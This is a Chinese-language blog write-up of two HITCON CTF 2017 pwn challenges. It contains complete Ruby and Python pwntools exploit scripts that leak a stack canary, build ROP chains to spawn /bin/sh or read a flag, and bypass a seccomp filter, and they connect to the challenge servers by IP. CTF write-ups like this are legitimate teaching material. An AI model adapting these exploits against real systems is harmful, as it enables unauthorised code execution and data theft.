---
layout: post
title:  "HITCON CTF 2017 Quals Writeup"
date:   2017-12-15 14:07:10 +0800
img: how-to-start.jpg
tags: [Writeup]
---


## start
這一題被迫要用 Ruby 來寫...
還好之前有摸過一點

會拿到兩個檔案
一個是 server.rb
另一個是 start
start 只有開在 localhost
server.rb 會架在 port 31337
傳 ruby 指令過去
他會幫你執行

因為 start 是 static link
可以找到 syscall 的 ROPgadget


![](https://imgur.com/J8y4ORD.png)

![](https://imgur.com/P97oHN3.png)

canary 的部分只要把 buf 和 canary 之間塞滿
就能在 puts(buf) 的時候順便把 canary print 出來
有 canary 之後就可以直接用 rop 執行 /bin/sh
然後 cat flag

exploit
{% highlight ruby lineos %}
#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

code = 'context.arch = "amd64"
z = Sock.new "127.0.0.1", 31338

z.send "A" * 0x19
z.recv(0x19)
canary = "\x00" + z.recv(7)
canary = u64(canary)
z.recv(8)

read = 0x440300
pop_rdi = 0x00000000004005d5
pop_rsi = 0x00000000004017f7
pop_rdx = 0x0000000000443776
stack = 0x006cb000 + 0x100
pop_rax_rdx_rbx = 0x000000000047a6e6
main = 0x400aee
call_put = 0x400b8e
leave = 0x0000000000400baf
syscall = 0x0000000000468e75

buf = "A" * 0x18
buf += flat([canary, stack, pop_rdi, 0, pop_rsi, stack, pop_rdx, 0x100, read, leave])
z.send buf 
z.send "exit\n"
buf = flat([0xdead, pop_rdi, stack + (12 * 8), pop_rsi, 0,
            pop_rdx, 0, pop_rax_rdx_rbx, 59, 0, 0, syscall, "/bin/sh\x00"])
print buf.length.to_s(16)
z.send buf
sleep(0.5)
z.send "cat /home/start/flag\n"
print z.recv
print z.recv
'


z = Sock.new "54.65.72.116", 31337
z.send code

z.interact
{% endhighlight %}

## artifact

![](https://imgur.com/3FHfk34.png)

![](https://imgur.com/cKdUKP9.png)

會看到保護幾乎都開啟了...
可是直接讓我們可以讀寫任一記憶體位址
所以可以利用 rop 呼叫 /bin/sh
但是當 rop 寫好開始執行後會發現
會有一個 SIGSYS 的錯誤
因為在程式一開頭呼叫了 prctl 函數
限制只有某些 syscall 可以執行


![](https://i.imgur.com/wUMI4WK.png)


第 12 行的地方
根據 prctl.h 得知 38 代表 PR_SET_NO_NEW_PRIVS
因為第二個參數是 2 所以 no_new_privs bit = 1


![](https://i.imgur.com/pzg0rkY.png)


第 13 行的地方
22 代表 PR_SET_SECCOMP
第二個參數是 2 所以是使用 SECCOMP_MODE_FILTER
由第三個參數設定過濾方式
第三個參數指向 sock_fprog 這個結構
這個結構又會指向 bpf 這段過濾用的程式碼


![](https://i.imgur.com/IjTrIJw.png)

{% highlight c lineos %}
struct sock_filter {	/* Filter block */
	__u16	code;   /* Actual filter code */
	__u8	jt;	/* Jump true */
	__u8	jf;	/* Jump false */
	__u32	k;      /* Generic multiuse field */
};

struct sock_fprog {			/* Required for SO_ATTACH_FILTER. */
	unsigned short		   len;	/* Number of filter blocks */
	struct sock_filter __user *filter;
};
{% endhighlight %}

利用 bpfdbg 反組譯 bpf 指令

{% highlight c %}
> load bpf 20,32 0 0 4, 21 0 16 -1073741762,32 0 0 32, 7 0 0 0,
32 0 0 0, 21 13 0 0,21 12 0 1, 21 11 0 5,21 10 0 8, 21 1 0 9,
21 0 3 10, 135 0 0 0,84 0 0 1, 21 4 5 1,29 4 0 11, 21 3 0 12,
21 2 0 60, 21 1 0 231,6 0 0 0, 6 0 0 2147418112
> disassemble
l0:	ld [4]                   /*arch*/
l1:	jeq {0xc000003e, l2, l18
l2:	ld [32]                  /*args[2]*/
l3:	tax 
l4:	ld [0]                   /*nr*/ 
l5:	jeq #0, l19, l6          /*sys_read*/
l6:	jeq #0x1, l19, l7        /*sys_write*/
l7:	jeq #0x5, l19, l8        /*sys_fstat*/
l8:	jeq #0x8, l19, l9        /*sys_lseek*/
l9:	jeq #0x9, l11, l10       /*sys_mmap check*/
l10:	jeq #0xa, l11, l14   	  /*sys_mprotect check*/
l11:	txa 	  
l12:	and #0x1	  
l13:	jeq #0x1, l18, l19   	  /*can't read*/
l14:	jeq x, l19, l15      	  /*syscall == args[2]*/
l15:	jeq #0xc, l19, l16   	  /*sys_brk*/
l16:	jeq #0x3c, l19, l17  	  /*sys_exit*/
l17:	jeq #0xe7, l19, l18  	  /*sys_exit_group*/
l18:	ret #0               	  /*KILL*/
l19:	ret #0x7fff0000      	  /*ALLOW*/
{% endhighlight %}

ld [x] 會讀取下面這個結構的值
{% highlight C lineos %}
struct seccomp_data {
	int nr;
	__u32 arch;
	__u64 instruction_pointer;
	__u64 args[6];
};
{% endhighlight %}
所以只要讓 syscall == 第三個參數的值就能使用了

exploit
{% highlight python lineos %}
from pwn import *
import time
import sys


def rop(ary):
    pos = 203
    for i in ary:
        proc.sendline('2')
        proc.sendline(str(pos))
        proc.sendline(str(i))
        pos += 1


def exploit(proc):
    prctl_offset = 0x1095b0
    raw_input("@")
    proc.sendline('1')
    proc.sendline('203')
    proc.recvuntil('Here it is: ')
    libc_base = int(proc.recvline())
    libc_base = libc_base - 0x203f1
    print('libc base: ' + hex(libc_base))

    pop_rdi = libc_base + 0x000000000001fd7a
    pop_rsi = libc_base + 0x000000000001fcbd
    pop_rdx = libc_base + 0x0000000000001b92
    pop_rax = libc_base + 0x000000000003a998
    pop_rcx = libc_base + 0x00000000001a97b8
    syscall = libc_base + 0x00000000000bc765
    read_adr = libc_base + 0x0000000000f8880
    open_adr = libc_base + 0x0000000000f8660
    printf_adr = libc_base + 0x0000000056510
    mov_rdi_rax_call_rcx = libc_base + 0x0000000000089ae9
    # pop_rcx, pop_rcx

    # f = open('flag', 0, 2)
    # read_len = read(f, &buf, len)
    # write(1, &buf, read_len)

    proc.sendline('1')
    proc.sendline('205')
    proc.recvuntil('Here it is: ')
    rbp = int(proc.recvline())
    print('rbp: ' + hex(rbp))

    raw_input("@")

    data_len = 0x100
    file_path = rbp + 0x100
    rop([pop_rdi, 0, pop_rsi, file_path, pop_rdx, 0x100, read_adr,
        pop_rdi, file_path, pop_rsi, 0, pop_rdx, 2, open_adr,
        pop_rcx, pop_rcx, mov_rdi_rax_call_rcx,
        pop_rsi, file_path + 0x20, pop_rdx, data_len, read_adr,
        pop_rdi, 1, pop_rsi, file_path + 0x20, pop_rdx, data_len,
        pop_rax, 1, syscall])
    proc.sendline('3')
    raw_input('@')
    proc.send("flag")


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc 52.192.178.153 31337'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./artifact'], env={'LD_LIBRARY_PATH': './'})
        gdb.attach(proc, '''
        set follow-fork-mode child
        b *main+0xba0
        continue
        ''')
    exploit(proc)
    proc.interactive()

{% endhighlight %}
